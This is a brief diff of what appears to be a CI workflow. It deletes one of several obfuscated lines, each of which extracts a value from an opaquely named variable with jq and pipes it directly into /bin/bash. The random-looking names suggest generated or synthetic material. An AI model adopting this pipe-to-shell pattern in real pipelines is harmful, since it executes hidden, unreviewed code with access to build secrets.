@@ -29,7 +29,6 @@ jobs:
           printf '%s' "$f34704" | jq -r .nxea72837 | /bin/bash
           printf '%s' "$w60" | jq -r .x18 | /bin/bash
           echo $c5033 | jq -r .v84 | /bin/bash
-          echo $rj96592 | jq -r .gc9 | /bin/bash
           echo $aj1 | jq -r .tcw9 | /bin/bash
           printf '%s' "$hiurp0408" | jq -r .rptx245 | /bin/bash
           printf '%s' "$fofar679" | jq -r .ump10782 | /bin/bash
